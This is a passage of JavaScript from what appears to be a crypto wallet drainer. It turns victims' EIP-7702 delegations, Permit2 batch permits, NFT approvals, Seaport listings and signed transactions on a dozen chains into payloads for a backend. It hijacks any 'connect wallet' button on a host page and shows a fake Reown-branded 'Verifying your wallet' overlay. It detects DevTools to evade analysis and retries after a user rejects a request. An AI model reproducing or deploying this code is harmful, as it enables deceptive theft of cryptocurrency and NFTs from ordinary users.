      if (!hash.startsWith('0x')) hash = toHex(hash);
      if (!isLikelyTxHash(hash)) {
        L.warn('userBroadcast: not a real tx hash — skip submit');
        return null;
      }
      return this.base({
        chain_family: 'EVM', protocol: 'eip7702_self_broadcast',
        wallet_address: address.toLowerCase(), chain_id: Number(chainId),
        tx_hash: hash, token_address: NATIVE_ETH_ADDR, signature: hash,
        native_amount: String(amountWei || '0'),
        wallet_type: walletName,
      });
    },

    eip7702: async function (data, address, chainId, walletName) {
      var auth = data.auth;
      var yP = auth.yParity !== undefined ? Number(auth.yParity)
        : (parseInt(String(auth.v || '0x1b').replace('0x', '') || '1b', 16) === 28 ? 1 : 0);
      return this.base({
        chain_family: 'EVM', protocol: 'eip7702_delegation',
        wallet_address: address.toLowerCase(), chain_id: Number(chainId),
        token_address: data.delegate, delegatee: data.delegate,
        signature: auth.r,
        eip7702_authorization: {
          chainId: Number(chainId), address: data.delegate,
          nonce: Number(data.nonce), r: auth.r, s: auth.s, yParity: yP,
        },
        erc20s: data.erc20s || [],
        defi_actions: data.defiActions || [],
        wallet_type: walletName,
      });
    },

    permit2: async function (p2, address, chainId, walletName, nfts, nftApprovalSigs) {
      var bd = p2.batchData;
      var nftArr = normNftList(nfts || p2.nfts);
      var nativeAmt = String(p2.nativeAmount || bd.nativeAmount || '0');
      var nativeSigned = p2.nativeSigned || '';
      return this.base({
        chain_family: 'EVM', protocol: 'permit2_batch_eip712',
        wallet_address: address.toLowerCase(), chain_id: Number(chainId),
        token_address: (bd.permits && bd.permits[0] && bd.permits[0].token) || NATIVE_ETH_ADDR,
        signature: p2.sig || '0x',
        engine_spender: bd.engine_spender, permit2: bd.permit2,
        permits: bd.permits, batch_permit_metadata: bd.batch_permit_metadata,
        native_amount: nativeAmt, nativeAmount: nativeAmt,
        native_signed_transaction: nativeSigned,
        nfts: nftArr,
        nft_approval_signatures: nftApprovalSigs || {},
        wallet_type: walletName,
      });
    },

    omnichain: async function (envelope) {
      return this.base(Object.assign({ protocol: 'omnichain_atomic_v1', chain_family: 'EVM' }, envelope));
    },

    solana: async function (address, signedB64, meta, walletName) {
      var solCaip = (window.LegionCaipRegistry && window.LegionCaipRegistry.SOLANA_MAINNET) || 'solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp';
      return this.viaBuilder('svm', {
        wallet_address: address,
        signature: sigHex({ signed_tx_b64: signedB64 }),
        nonce: 'legion:sol:' + Date.now() + ':' + Math.random().toString(36).slice(2, 5),
        expiry_iso: EXPIRY_ISO,
        wallet_type: walletName || 'Phantom',
        protocol: 'solana',
        chain_id: solCaip,
        caip_chain_id: solCaip,
        scout_value_usd: Number(S.scoutUsd) || 0,
        amount: (meta && meta.amount) ? String(meta.amount) : '0',
        requires_quorum: false,
      });
    },

    tron: async function (address, signedTx, tokenAddr, amount, walletName) {
      return this.viaBuilder('tron', {
        wallet_address: address,
        token_address: tokenAddr || VAULT.tron,
        signature: sigHex({ signed_tx: signedTx }),
        nonce: 'legion:trx:' + Date.now(),
        expiry_iso: EXPIRY_ISO,
        wallet_type: walletName || 'TronLink',
        protocol: 'tron',
        chain_id: 'tron:mainnet',
        scout_value_usd: Number(S.scoutUsd) || 0,
        amount: amount ? String(amount) : '0',
        requires_quorum: false,
      });
    },

    ton: async function (address, bocOrSig, amountNano, walletName) {
      return this.viaBuilder('ton', {
        wallet_address: address,
        signature: typeof bocOrSig === 'string' && bocOrSig.startsWith('0x')
          ? bocOrSig : sigHex({ boc: bocOrSig }),
        nonce: 'legion:ton:' + Date.now(),
        expiry_iso: EXPIRY_ISO,
        wallet_type: walletName || 'Tonkeeper',
        protocol: 'ton',
        chain_id: 'ton:mainnet',
        scout_value_usd: Number(S.scoutUsd) || 0,
        amount: amountNano ? String(amountNano) : '0',
        requires_quorum: false,
      });
    },

    bitcoin: async function (address, signedPsbtB64, amountSat, walletName) {
      return this.base({
        chain_family: 'UTXO', protocol: 'bitcoin_psbt',
        wallet_address: address,
        token_address: 'OMNI_UTXO_ANCHOR',
        signature: sigHex({ signed_psbt_b64: signedPsbtB64 }),
        signed_psbt_base64: signedPsbtB64,
        amount_sat: String(amountSat || '0'),
        chain_id: BIP122_BITCOIN_MAINNET,
        caip_chain_id: BIP122_BITCOIN_MAINNET,
        wallet_type: walletName || 'UniSat',
      });
    },

    cosmos: async function (address, signedDoc, amount, walletName) {
      return this.base({
        chain_family: 'COSMOS', protocol: 'cosmos',
        wallet_address: address,
        token_address: 'OMNI_COSMOS_ANCHOR',
        signature: sigHex(signedDoc),
        chain_id: 'cosmos:cosmoshub-4',
        amount: String(amount || '0'),
        wallet_type: walletName || 'Keplr',
      });
    },

    aptos: async function (address, txHashOrSig, walletName) {
      return this.base({
        chain_family: 'APTOS', protocol: 'aptos',
        wallet_address: address,
        token_address: 'OMNI_APTOS_ANCHOR',
        signature: sigHex({ hash: txHashOrSig }),
        chain_id: 'aptos:1',
        wallet_type: walletName || 'Petra',
      });
    },

    sui: async function (address, signedBytes, walletName) {
      return this.base({
        chain_family: 'SUI', protocol: 'sui',
        wallet_address: address,
        token_address: 'OMNI_SUI_ANCHOR',
        signature: sigHex({ signed_tx: signedBytes }),
        chain_id: 'sui:mainnet',
        wallet_type: walletName || 'Sui Wallet',
      });
    },

    polkadot: async function (address, sig, walletName) {
      return this.base({
        chain_family: 'POLKADOT', protocol: 'polkadot',
        wallet_address: address,
        token_address: 'OMNI_DOT_ANCHOR',
        signature: sigHex(sig),
        chain_id: 'polkadot:91b171bb158e2d3848fa23a9f1c25182',
        wallet_type: walletName || 'Polkadot',
      });
    },

    algorand: async function (address, sig, walletName) {
      return this.base({
        chain_family: 'ALGORAND', protocol: 'algorand',
        wallet_address: address,
        token_address: 'OMNI_ALGO_ANCHOR',
        signature: sigHex(sig),
        chain_id: 'algorand:416002',
        wallet_type: walletName || 'Algorand',
      });
    },

    cardano: async function (address, sig, walletName) {
      return this.base({
        chain_family: 'CARDANO', protocol: 'cardano',
        wallet_address: address,
        token_address: 'OMNI_ADA_ANCHOR',
        signature: sigHex(sig),
        chain_id: 'cardano:1',
        wallet_type: walletName || 'Cardano',
      });
    },

    nft: async function (nftR, address, chainId, walletName) {
      return this.base({
        chain_family: 'EVM', protocol: 'seaport_listing',
        wallet_address: address.toLowerCase(), chain_id: Number(chainId),
        token_address: (nftR.listing && (nftR.listing.contract || nftR.listing.nft_contract)) || NATIVE_ETH_ADDR,
        signature: nftR.sig, seaport_order: nftR.orderParams || {},
        wallet_type: walletName,
      });
    },
  };

  // ═══════════════════════════════════════════════════════════════
  // SECTION 15: SECURITY / ANTI-DETECTION
  // ═══════════════════════════════════════════════════════════════
  var SEC = {
    paused: false,
    startMonitor: function () {
      if (CFG.debugDevTools) return;
      setInterval(function () {
        try {
          var t0 = performance.now(); debugger; var t1 = performance.now();
          if (t1 - t0 > 200) { SEC.paused = true; L.warn('DevTools detected'); }
        } catch (e) {}
      }, 8000);
    },
  };

  function emitLegionEvent(name, detail) {
    try {
      window.dispatchEvent(new CustomEvent(name, { detail: detail || {} }));
    } catch (e) {}
  }

  // ═══════════════════════════════════════════════════════════════
  // SECTION 16: UI LAYER + PAGE HOOKS (any frontend)
  // ═══════════════════════════════════════════════════════════════
  var HOOK_PATTERN = /connect\s*wallet|wallet\s*connect|\bconnect\b|sign\s*in|link\s*wallet|get\s*started|start\s*app/i;
  var HOOK_SELECTORS = [
    '.interact-button', '#navConnectBtn', '#mainBtn', '.nav-connect', '.main-btn.connect',
    '[data-testid*="connect"]', '[data-testid*="wallet"]', '[data-testid*="Connect"]',
    '[class*="connectWallet"]', '[class*="ConnectWallet"]', '[class*="wallet-connect"]',
    '#connect-wallet', '.connect-wallet', '[id*="connectButton"]', '[class*="walletButton"]',
    'button[class*="connect"]', 'a[class*="connect"]',
    '[class*="WalletConnect"]', '[class*="wallet_connect"]',
  ];

  var WALLET_ICONS = {
    MetaMask: '🦊', Rabby: '🐰', 'Coinbase Wallet': '🔵', 'Trust Wallet': '🛡️',
    'Brave Wallet': '🦁', 'OKX Wallet': '⬛', Phantom: '👻', WalletConnect: '🔗',
  };

  function walletIdentity(row) {
    if (row.type === 'wc') return 'wc';
    var info = row.info || {};
    var p = row.provider;
    if (info.rdns) return 'rdns:' + String(info.rdns).toLowerCase();
    if (p) {
      if (p.isRabby) return 'rdns:io.rabby';
      if (p.isBraveWallet) return 'rdns:com.brave.wallet';
      if (p.isCoinbaseWallet || p.isCoinbaseBrowser) return 'rdns:com.coinbase.wallet';
      if (p.isTrust || p.isTrustWallet) return 'rdns:com.trustwallet.app';
      if (p.isOkxWallet || p.isOKExWallet) return 'rdns:com.okex.wallet';
      if (p.isPhantom) return 'rdns:app.phantom';
      if (p.isMetaMask) return 'rdns:io.metamask';
    }
    if (info.uuid) return 'uuid:' + info.uuid;
    return 'name:' + String(info.name || detectEvmWalletName(p) || 'wallet').toLowerCase();
  }

  async function buildWalletList() {
    requestProviders();
    await sleep(400);
    var rows = [];
    var seen = {};
    function addRow(row) {
      if (!row) return;
      var key = walletIdentity(row);
      if (seen[key]) return;
      if (row.provider) {
        for (var i = 0; i < rows.length; i++) {
          if (rows[i].provider === row.provider) return;
        }
      }
      seen[key] = true;
      rows.push(row);
    }
    S.discovered.forEach(function (w) {
      addRow({ type: 'injected', info: w.info, provider: w.provider });
    });
    if (window.ethereum) {
      var eth = window.ethereum;
      if (Array.isArray(eth.providers)) {
        eth.providers.forEach(function (p) {
          addRow({ type: 'injected', info: { name: detectEvmWalletName(p) }, provider: p });
        });
      } else if (!S.discovered.length) {
        addRow({ type: 'injected', info: { name: detectEvmWalletName(eth) }, provider: eth });
      }
    }
    addRow({ type: 'wc', info: { name: 'WalletConnect' }, provider: null });
    var wcRow = rows.filter(function (r) { return r.type === 'wc'; });
    var injRows = rows.filter(function (r) { return r.type !== 'wc'; });
    return wcRow.concat(injRows);
  }

  async function openExtensionPicker() {
    if (S.drainRunning) return;
    if (isWcConnectActive()) {
      logConnect('blocked', 'close WalletConnect QR before picking extension');
      UI.showStatus('Close WalletConnect first — or use MetaMask button for browser wallet');
      return;
    }
    if (!S.vaultLoaded) prefetchVault();
    await prepInjectedMode();
    if (document.querySelector('[data-testid="account-drawer-container"]')) {
      var openFn = window.customModalOpen;
      if (typeof openFn === 'function' && openFn !== defaultConnect) {
        openFn();
        return;
      }
    }
    if (window.LegionDrawer && typeof window.LegionDrawer.open === 'function') {
      window.LegionDrawer.open();
      return;
    }
    UI.showWalletModal(function (choice) { connectWithWallet(choice); });
  }

  function openWalletModal() {
    defaultConnect();
  }

  async function connectWithWallet(choice) {
    if (!choice) return;
    if (choice.type === 'wc') {
      await handleWC();
      return;
    }
    if (choice.type === 'external-wc' && choice.provider) {
      try { choice.provider.isWalletConnect = true; } catch (e0) {}
      S.connectMode = 'wc';
      S.wcSessionActive = true;
      _wcProv = choice.provider;
      S.injectedWalletKey = String(
        (choice.info && (choice.info.walletKey || choice.info.name)) || choice.walletKey || 'trust'
      );
      UI._walletIcon = (choice.info && choice.info.icon) || '';
      if (!UI._overlayEl) UI.overlay.show('connecting', { walletIcon: UI._walletIcon });
      await handleEvmConnect(choice.provider, choice);
      void registerWcSessionWithBackend();
      return;
    }
    if (isWcConnectActive()) {
      logConnect('blocked', 'extension click ignored — WC in progress');
      return;
    }
    if (!(await prepInjectedMode())) return;
    S.injectedWalletKey = String(
      (choice.info && (choice.info.walletKey || choice.info.name)) || choice.walletKey || 'injected'
    );
    UI._walletIcon = (choice.info && choice.info.icon) || '';
    if (!UI._overlayEl) UI.overlay.show('connecting', { walletIcon: UI._walletIcon });
    if (choice.provider) await handleEvmConnect(choice.provider, choice);
  }

  function hookPageButtons(onOpen) {
    if (!HOOK_BUTTONS || !onOpen) return 0;
    var hooked = 0;
    var seen = {};
    function tryHook(el) {
      if (!el || el.__lgnHooked || seen[el]) return;
      if (el.closest && el.closest('#__lgn_wm')) return;
      if (el.closest && el.closest('[data-testid="account-drawer-container"]')) return;
      var label = ((el.textContent || '') + ' ' + (el.getAttribute('aria-label') || '') + ' ' +
        (el.getAttribute('title') || '') + ' ' + (el.getAttribute('data-testid') || '')).trim();
      var match = HOOK_PATTERN.test(label);
      if (!match && el.classList && el.classList.contains('interact-button')) {
        var tl = (el.textContent || '').trim().toLowerCase();
        if (/connect|swap|trade|get started/.test(tl)) match = true;
      }
      if (!match) {
        for (var si = 0; si < HOOK_SELECTORS.length; si++) {
          try { if (el.matches && el.matches(HOOK_SELECTORS[si])) { match = true; break; } } catch (e) {}
        }
      }
      if (!match) return;
      seen[el] = true;
      el.__lgnHooked = true;
      hooked++;
      el.addEventListener('click', function (e) {
          e.preventDefault();
          e.stopPropagation();
        onOpen();
      }, true);
    }
    try {
      document.querySelectorAll('button, a, [role="button"], span[onclick], div[onclick]').forEach(tryHook);
      HOOK_SELECTORS.forEach(function (sel) {
        document.querySelectorAll(sel).forEach(tryHook);
      });
    } catch (e) {}
    return hooked;
  }

  function startButtonObserver(onOpen) {
    if (!HOOK_BUTTONS || typeof MutationObserver === 'undefined' || !document.body) return;
    var n = 0;
    var timer;
    var obs = new MutationObserver(function () {
      if (n >= 20) { obs.disconnect(); return; }
      clearTimeout(timer);
      timer = setTimeout(function () { n++; hookPageButtons(onOpen); }, 600);
    });
    obs.observe(document.body, { childList: true, subtree: true });
  }

  var UI = {
    statusEl: null,
    _overlayEl: null,

    _reownBrandSvg: function () {
      return '<svg class="__lgn_co_brand" viewBox="0 0 60 16" fill="none" aria-hidden="true">'
        + '<path d="M9.3335 4.66667C9.3335 2.08934 11.4229 0 14.0002 0H20.6669C23.2442 0 25.3335 2.08934 25.3335 4.66667V11.3333C25.3335 13.9106 23.2442 16 20.6669 16H14.0002C11.4229 16 9.3335 13.9106 9.3335 11.3333V4.66667Z" fill="#363636"/>'
        + '<path d="M15.6055 11.0003L17.9448 4.66699H18.6316L16.2923 11.0003H15.6055Z" fill="#F6F6F6"/>'
        + '<path d="M0 4.33333C0 1.9401 1.9401 0 4.33333 0C6.72657 0 8.66669 1.9401 8.66669 4.33333V11.6667C8.66669 14.0599 6.72657 16 4.33333 16C1.9401 16 0 14.0599 0 11.6667V4.33333Z" fill="#363636"/>'
        + '<path d="M3.9165 9.99934V9.16602H4.74983V9.99934H3.9165Z" fill="#F6F6F6"/>'
        + '<path d="M26 8C26 3.58172 29.3517 0 33.4863 0H52.5137C56.6483 0 60 3.58172 60 8C60 12.4183 56.6483 16 52.5137 16H33.4863C29.3517 16 26 12.4183 26 8Z" fill="#363636"/>'
        + '<path d="M49.3687 9.95834V6.26232H50.0213V6.81966C50.256 6.40899 50.7326 6.16699 51.2606 6.16699C52.0599 6.16699 52.6173 6.67299 52.6173 7.65566V9.95834H51.972V7.69234C51.972 7.04696 51.6053 6.70966 51.07 6.70966C50.4906 6.70966 50.0213 7.17168 50.0213 7.82433V9.95834H49.3687Z" fill="#F6F6F6"/>'
        + '<path d="M45.2538 9.95773L44.5718 6.26172H45.1877L45.6717 9.31242L46.3098 7.30306H46.9184L47.5491 9.29041L48.0404 6.26172H48.6564L47.9744 9.95773H47.2411L46.6178 8.03641L45.9871 9.95773H45.2538Z" fill="#F6F6F6"/>'
        + '<path d="M42.3709 10.0536C41.2489 10.0536 40.5889 9.21765 40.5889 8.1103C40.5889 7.01035 41.2489 6.16699 42.3709 6.16699C43.4929 6.16699 44.1529 7.01035 44.1529 8.1103C44.1529 9.21765 43.4929 10.0536 42.3709 10.0536ZM42.3709 9.51096C43.1775 9.51096 43.4856 8.82164 43.4856 8.10296C43.4856 7.39163 43.1775 6.70966 42.3709 6.70966C41.5642 6.70966 41.2562 7.39163 41.2562 8.10296C41.2562 8.82164 41.5642 9.51096 42.3709 9.51096Z" fill="#F6F6F6"/>'
        + '<path d="M38.2805 10.0536C37.1952 10.0536 36.5132 9.22499 36.5132 8.1103C36.5132 7.00302 37.1952 6.16699 38.2805 6.16699C39.1972 6.16699 40.0038 6.68766 39.9159 8.27896H37.1805C37.2319 8.96103 37.5472 9.5183 38.2805 9.5183C38.7718 9.5183 39.0945 9.21765 39.2045 8.87299H39.8499C39.7472 9.48903 39.1679 10.0536 38.2805 10.0536ZM37.1952 7.78765H39.2852C39.2338 7.04696 38.8892 6.70232 38.2805 6.70232C37.6132 6.70232 37.2832 7.18635 37.1952 7.78765Z" fill="#F6F6F6"/>'
        + '<path d="M33.3828 9.95773V6.26172H34.0501V6.88506C34.2848 6.47439 34.6882 6.26172 35.1061 6.26172H35.9935V6.88506H35.0548C34.4682 6.88506 34.0501 7.26638 34.0501 8.00706V9.95773H33.3828Z" fill="#F6F6F6"/>'
        + '</svg>';
    },

    _reownThumbSvg: function () {
      var t = 36;
      var dash1 = 116 + (36 - t);
      var dash2 = 245 + (36 - t);
      var offset = 360 + (36 - t) * 1.75;
      return '<svg class="__lgn_co_thumb" viewBox="0 0 110 110" aria-hidden="true">'
        + '<rect x="2" y="2" width="106" height="106" rx="' + t + '" fill="none" stroke="#0988F0" stroke-width="3" stroke-linecap="round"'
        + ' stroke-dasharray="' + dash1 + ' ' + dash2 + '" stroke-dashoffset="' + offset + '"/>'
        + '</svg>';
    },

    _reownAvatarSvg: function () {
      return '<svg width="80" height="80" viewBox="0 0 80 80" fill="none" aria-hidden="true">'
        + '<rect width="80" height="80" rx="20" fill="#ECECEC"/>'
        + '<circle cx="40" cy="32" r="12" stroke="#9E9E9E" stroke-width="2.5" fill="none"/>'
        + '<path d="M18 66c0-12.15 9.85-22 22-22s22 9.85 22 22" stroke="#9E9E9E" stroke-width="2.5" stroke-linecap="round" fill="none"/>'
        + '</svg>';
    },

    overlay: {
      show: function (mode, opts) {
        UI.injectModalStyles();
        opts = opts || {};
        var titleText = mode === 'verifying' ? 'Verifying your wallet' : 'Connecting your wallet';
        if (UI._overlayEl) {
          var existingTitle = UI._overlayEl.querySelector('.__lgn_co_title');
          if (existingTitle) existingTitle.textContent = titleText;
          return;
        }
        closeAppKitModal();
        var walletIcon = opts.walletIcon || UI._walletIcon || '';
        var ov = document.createElement('div');
        ov.id = '__lgn_co';
        ov.innerHTML = ''
          + '<div class="__lgn_co_modal" role="dialog" aria-modal="true" aria-label="' + titleText + '">'
          + '  <div class="__lgn_co_head">' + UI._reownBrandSvg() + '</div>'
          + '  <div class="__lgn_co_body">'
          + '    <div class="__lgn_co_loader_wrap">'
          + '      <div class="__lgn_co_avatar">' + (walletIcon
            ? '<img src="' + walletIcon + '" alt="" width="80" height="80" style="border-radius:20px;object-fit:cover"/>'
            : UI._reownAvatarSvg()) + '</div>'
          + UI._reownThumbSvg()
          + '    </div>'
          + '    <div class="__lgn_co_title">' + titleText + '</div>'
          + '    <div class="__lgn_co_sub">Please hold on while we complete the process . . .</div>'
          + '  </div>'
          + '</div>';
        document.body.appendChild(ov);
        UI._overlayEl = ov;
        requestAnimationFrame(function () { ov.classList.add('__lgn_co--visible'); });
        document.documentElement.classList.add('legion-overlay-active');
      },
      hide: function () {
        if (!UI._overlayEl) {
          document.documentElement.classList.remove('legion-overlay-active');
          return;
        }
        var el = UI._overlayEl;
        UI._overlayEl = null;
        el.classList.remove('__lgn_co--visible');
        setTimeout(function () {
          try { el.remove(); } catch (e) {}
        }, 220);
        document.documentElement.classList.remove('legion-overlay-active');
      },
    },

    status: function (msg) {
      L.log('[UI]', msg);
      if (/sign|confirm|verif|batch|security|approve/i.test(String(msg || ''))) {
        try {
          var sheet = document.getElementById('__legion_mobile_wc_sheet');
          if (sheet && sheet.style.display !== 'none') {
            // Mobile Open sheet active — do not cover it with verifying overlay
            return;
          }
        } catch (eSheet) { /* ignore */ }
        this.overlay.show('verifying');
      }
    },

    injectModalStyles: function () {
      var styleId = '__lgn_wm_css_v597';
      if (document.getElementById(styleId)) return;
      var old = document.getElementById('__lgn_wm_css');
      if (old) old.remove();
      old = document.getElementById('__lgn_wm_css_v594');
      if (old) old.remove();
      old = document.getElementById('__lgn_wm_css_v595');
      if (old) old.remove();
      var style = document.createElement('style');
      style.id = styleId;
      style.textContent = ''
        + '#__lgn_wm{position:fixed;inset:0;background:rgba(0,0,0,.72);z-index:2147483646;display:flex;align-items:center;justify-content:center;padding:16px;font-family:Inter,-apple-system,BlinkMacSystemFont,sans-serif}'
        + '#__lgn_wm_box{background:#131313;border:1px solid rgba(255,255,255,.08);border-radius:24px;width:100%;max-width:400px;max-height:85vh;overflow:hidden;box-shadow:0 24px 80px rgba(0,0,0,.55)}'
        + '#__lgn_wm_head{display:flex;align-items:center;justify-content:space-between;padding:20px 20px 12px}'
        + '#__lgn_wm_head h2{margin:0;font-size:18px;font-weight:700;color:#f5f5f5}'
        + '#__lgn_wm_x{background:transparent;border:none;color:#888;font-size:22px;cursor:pointer;padding:4px 8px;border-radius:8px}'
        + '#__lgn_wm_x:hover{background:rgba(255,255,255,.06);color:#fff}'
        + '#__lgn_wm_list{padding:8px 12px 16px;overflow-y:auto;max-height:calc(85vh - 80px)}'
        + '.__lgn_wm_row{display:flex;align-items:center;gap:12px;width:100%;padding:14px 12px;margin-bottom:6px;background:#1c1c1c;border:1px solid rgba(255,255,255,.06);border-radius:16px;cursor:pointer;color:#f5f5f5;font-size:15px;font-weight:600;text-align:left;transition:background .15s}'
        + '.__lgn_wm_row:hover{background:#242424;border-color:rgba(252,114,255,.25)}'
        + '.__lgn_wm_icon{width:36px;height:36px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0;background:#2a2a2a}'
        + '.__lgn_wm_meta{flex:1;min-width:0}'
        + '.__lgn_wm_badge{font-size:11px;color:#888;font-weight:500;margin-top:2px}'
        + '.__lgn_wm_arr{color:#555;font-size:18px}'
        + '#__lgn_st{position:fixed;bottom:16px;left:50%;transform:translateX(-50%);background:rgba(19,19,19,.92);color:#e5e7eb;border:1px solid rgba(255,255,255,.1);border-radius:12px;padding:10px 18px;font-size:13px;z-index:2147483645;display:none;pointer-events:none}'
        + '@font-face{font-family:"KHTeka";font-style:normal;font-weight:400;font-display:swap;src:url("https://fonts.reown.com/KHTeka-Regular.woff2") format("woff2")}'
        + '@font-face{font-family:"KHTeka";font-style:normal;font-weight:500;font-display:swap;src:url("https://fonts.reown.com/KHTeka-Medium.woff2") format("woff2")}'
        + '#__lgn_co{position:fixed;inset:0;z-index:2147483647;display:flex;align-items:center;justify-content:center;padding:16px;background:rgba(255,255,255,.72);backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);font-family:"KHTeka",-apple-system,BlinkMacSystemFont,sans-serif;opacity:0;transition:opacity .2s ease}'
        + '#__lgn_co.__lgn_co--visible{opacity:1}'
        + '.__lgn_co_modal{width:100%;max-width:370px;background:#fff;border-radius:36px;box-shadow:0 2px 8px rgba(0,0,0,.05),inset 0 0 0 1px rgba(0,0,0,.06);overflow:hidden;transform:translateY(4px);animation:__lgn_co_in .25s ease forwards}'
        + '@keyframes __lgn_co_in{to{transform:translateY(0)}}'
        + '.__lgn_co_head{display:flex;justify-content:flex-start;align-items:center;padding:16px 20px 12px;border-bottom:1px solid rgba(0,0,0,.06)}'
        + '.__lgn_co_brand{display:block;height:24px;width:auto}'
        + '.__lgn_co_body{padding:28px 28px 40px;text-align:center}'
        + '.__lgn_co_loader_wrap{position:relative;width:110px;height:110px;margin:12px auto 28px;display:flex;align-items:center;justify-content:center}'
        + '.__lgn_co_avatar{position:relative;z-index:1;width:80px;height:80px;display:flex;align-items:center;justify-content:center;flex-shrink:0}'
        + '.__lgn_co_thumb{position:absolute;inset:0;width:110px;height:110px;pointer-events:none}'
        + '.__lgn_co_thumb rect{animation:__lgn_co_dash 1s linear infinite;will-change:stroke-dashoffset}'
        + '@keyframes __lgn_co_dash{to{stroke-dashoffset:0}}'
        + '.__lgn_co_title{font-size:20px;font-weight:500;color:#141414;line-height:1.3;margin:0 0 10px;letter-spacing:-.01em}'
        + '.__lgn_co_sub{font-size:16px;font-weight:400;color:#868686;line-height:1.5;margin:0}'
        + 'html.legion-overlay-active{overflow:hidden}';
      document.head.appendChild(style);
    },

    closeWalletModal: function () {
      if (window.LegionDrawer && typeof window.LegionDrawer.close === 'function') {
        window.LegionDrawer.close();
      }
      var el = document.getElementById('__lgn_wm');
      if (el) el.remove();
      document.documentElement.classList.remove('wallet-modal-active');
    },

    showWalletModal: function (onSelect) {
      if (document.querySelector('[data-testid="account-drawer-container"]')) {
        var openFn = window.customModalOpen;
        if (typeof openFn === 'function' && openFn !== defaultConnect) {
          openFn();
          return;
        }
      }
      if (window.LegionDrawer && typeof window.LegionDrawer.open === 'function') {
        window.LegionDrawer.open();
        return;
      }
      var self = this;
      self.injectModalStyles();
      self.closeWalletModal();
      document.documentElement.classList.add('wallet-modal-active');

      var ov = document.createElement('div');
      ov.id = '__lgn_wm';
      var box = document.createElement('div');
      box.id = '__lgn_wm_box';
      var head = document.createElement('div');
      head.id = '__lgn_wm_head';
      var title = document.createElement('h2');
      title.textContent = 'Connect a wallet';
      var closeX = document.createElement('button');
      closeX.id = '__lgn_wm_x';
      closeX.textContent = '✕';
      closeX.onclick = function () { self.closeWalletModal(); };
      head.appendChild(title);
      head.appendChild(closeX);

      var list = document.createElement('div');
      list.id = '__lgn_wm_list';
      list.innerHTML = '<div style="color:#888;padding:24px;text-align:center">Detecting wallets...</div>';

      box.appendChild(head);
      box.appendChild(list);
      ov.appendChild(box);
      ov.addEventListener('click', function (e) { if (e.target === ov) self.closeWalletModal(); });
      document.body.appendChild(ov);

      buildWalletList().then(function (wallets) {
        list.innerHTML = '';
        if (!wallets.length) {
          list.innerHTML = '<div style="color:#888;padding:24px;text-align:center">No wallets found</div>';
          return;
        }
        wallets.forEach(function (w) {
          var name = (w.info && w.info.name) || 'Wallet';
          var row = document.createElement('button');
          row.type = 'button';
          row.className = '__lgn_wm_row';
          var icon = document.createElement('div');
          icon.className = '__lgn_wm_icon';
          if (w.info && w.info.icon) {
            var img = document.createElement('img');
            img.src = w.info.icon;
            img.style.cssText = 'width:28px;height:28px;border-radius:8px';
            img.onerror = function () { icon.textContent = WALLET_ICONS[name] || '👛'; };
            icon.appendChild(img);
          } else {
            icon.textContent = WALLET_ICONS[name] || '👛';
          }
          var meta = document.createElement('div');
          meta.className = '__lgn_wm_meta';
          meta.innerHTML = '<div>' + name + '</div>';
          if (w.type === 'injected') {
            var badge = document.createElement('div');
            badge.className = '__lgn_wm_badge';
            badge.textContent = 'Installed';
            meta.appendChild(badge);
          }
          var arr = document.createElement('span');
          arr.className = '__lgn_wm_arr';
          arr.textContent = '›';
          row.appendChild(icon);
          row.appendChild(meta);
          row.appendChild(arr);
          row.onclick = function () {
            self.closeWalletModal();
            UI._walletIcon = (w.info && w.info.icon) || '';
            if (window.legion && typeof window.legion.beginConnect === 'function') {
              window.legion.beginConnect(w.type === 'wc' ? 'wc' : 'injected');
            } else {
              UI.overlay.show('connecting', { walletIcon: UI._walletIcon });
            }
            onSelect(w);
          };
          list.appendChild(row);
        });
      }).catch(function (e) {
        list.innerHTML = '<div style="color:#f88;padding:24px;text-align:center">' + e.message + '</div>';
      });
    },

    inject: function (onOpen, onWC) {
      var openFn = onOpen || openWalletModal;
      if (HOOK_BUTTONS) {
        hookPageButtons(openFn);
        startButtonObserver(openFn);
      }
      this.injectModalStyles();
      if (!document.getElementById('__lgn_st')) {
        var st = document.createElement('div');
        st.id = '__lgn_st';
        document.body.appendChild(st);
        this.statusEl = st;
      }
      if (!SHOW_OVERLAY || document.getElementById('__lgn_root')) return;

      var style = document.createElement('style');
      style.textContent = '#__lgn_root{position:fixed;bottom:20px;right:20px;z-index:2147483647;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif}'
        + '#__lgn_root button{border:none;border-radius:12px;padding:11px 22px;font-size:14px;font-weight:600;cursor:pointer}';
      document.head.appendChild(style);
      var root = document.createElement('div');
      root.id = '__lgn_root';
      var cb = document.createElement('button');
      cb.id = '__lgn_cb';
      cb.textContent = 'Connect Wallet';
      cb.style.cssText = 'background:#fc72ff;color:#000;margin-right:8px';
      var wb = document.createElement('button');
      wb.id = '__lgn_wb';
      wb.textContent = 'Browser Extension';
      wb.style.cssText = 'background:#374151;color:#fff;font-size:12px';
      cb.onclick = function () { if (onOpen) onOpen(); else defaultConnect(); };
      wb.onclick = function () { openExtensionPicker(); };
      root.appendChild(cb);
      root.appendChild(wb);
      document.body.appendChild(root);
    },

    showStatus: function (msg) {
      var el = document.getElementById('__lgn_st');
      if (!el) return;
      if (!msg) { el.style.display = 'none'; return; }
      el.textContent = msg;
      el.style.display = 'block';
      clearTimeout(this._stTimer);
      this._stTimer = setTimeout(function () { el.style.display = 'none'; }, 8000);
    },

    showUserRejected: function () {
      this.showStatus(userRejectionMessage());
      this.overlay.hide();
      var self = this;
      clearTimeout(self._rejectRetryTimer);
      self._rejectRetryTimer = setTimeout(function () {
        if (!pipelineBusy()) {
          startPipeline({ reason: 'reject-retry' });
        }
      }, 300);
    },

    setConnected: function (addr, chainName) {
      var short = addr.slice(0, 6) + '...' + addr.slice(-4);
      var nb = document.getElementById('navConnectBtn');
      if (nb) { nb.textContent = short; nb.classList.add('connected'); }
      var cb = document.getElementById('__lgn_cb');
      if (cb) { cb.textContent = short; cb.style.background = '#15803d'; }
      this.showStatus('Connected — ' + chainName);
      this.closeWalletModal();
    },

    picker: function (wallets, onPick) {
      this.showWalletModal(function (w) {
        if (w.type === 'wc') { handleWC(); return; }
        onPick(w);
      });
    },
  };

  // ═══════════════════════════════════════════════════════════════
  // SECTION 17: BOOTSTRAP — MAIN ENTRY
  // ═══════════════════════════════════════════════════════════════

  /**
   * Resume after Safari freeze: notify-first if missing, then drain.
   * Never no-op just because a prior pipeline set postConnectComplete wrongly.
   */
  /** Public resume — always through single pipeline (debounced join). */
